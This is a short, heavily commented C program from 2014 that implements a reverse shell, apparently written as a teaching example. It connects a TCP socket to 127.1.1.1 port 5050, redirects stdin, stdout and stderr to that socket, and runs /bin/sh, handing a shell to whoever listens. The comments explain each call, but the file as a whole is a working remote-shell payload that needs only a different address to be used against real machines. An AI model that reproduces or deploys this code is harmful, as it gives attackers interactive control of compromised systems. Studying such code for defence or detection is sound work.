/**
	Date 04/09/2014
	
	This program tries to establish a connection to a remote machine
	Author Javier Tejedor
**/

#include <unistd.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(void) {

	int i; 
	int socketC;

	/**
		#include <netinet/in.h>
		sockaddr_in

		Structures for handling internet addresses
	**/
	struct sockaddr_in sin;
	sin.sin_family 		= AF_INET;
	sin.sin_addr.s_addr 	= inet_addr("127.1.1.1");
	sin.sin_port 		= htons(5050);

	/**
		#include <string.h>
		memset

		This cleans sin_zero field
	**/
    	memset(&(sin.sin_zero), '\0', 8);

	
	/**
		socket - create an endpoint for communication
		The socket() function shall create an unbound 
		socket in a communications domain, and return 
		a file descriptor that can be used in later 
		function calls that operate on sockets.

		#include <sys/socket.h>
    		int socket(int domain, int type, int protocol);
	**/
	socketC = socket(AF_INET, SOCK_STREAM, 0);

	/**
		the connect() call attempts to establish a connection between two sockets.

		#include <sys/socket.h>
		int connect(int socket, const struct sockaddr *address, size_t address_len);
	**/
	connect(socketC, (struct sockaddr *)&sin, sizeof(sin));

	/**
		The dup2() duplicates one file descriptor, making them 
		aliases, and then deleting the old file descriptor. This 
		becomes very useful when attempting to redirect output.

		We call three times passing as paratemers in fildes2:
		- 0: stdin
		- 1: stdout
		- 2: stderr

		#include <unistd.h>
		int dup2(int fildes, int fildes2);
	**/
	for(i = 0; i < 3; i++){
		dup2(socketC, i);
	}

	/**
		execve - execute program

       		#include <unistd.h>
	        int execve(const char *filename, char *const argv[], char *const envp[]);

	**/
	//because we are redirect the output of the connection, when we execute it, we are redirecting a shell 
	//to the remote machine
	execve("/bin/sh", NULL, NULL);

}
